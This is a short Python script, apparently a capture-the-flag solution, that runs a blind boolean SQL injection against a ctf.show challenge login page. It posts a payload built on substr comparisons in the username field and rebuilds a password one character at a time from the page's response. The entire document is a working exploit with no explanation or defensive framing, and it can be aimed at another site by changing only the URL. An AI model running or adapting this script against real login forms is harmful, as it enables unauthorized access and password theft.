import requests
 
passwd = ''
for i in range(1, 18):
    for j in '0123456789abcdefghijklmnopqrstuvwxyz':
        url = "http://9b3a5224-ebad-4712-8171-aa1fb1be2cf9.challenge.ctf.show/admin/checklogin.php"
        data = {
                "u": "'||substr(p,{},1)<'{}".format(i,j),
                "p": ""
                }
        # print(data)
        c = requests.post(url, data=data)
        # print(c.text)
        if '用户名' not in c.text:
            passwd += chr(ord(j)-1)
            print(passwd)
            break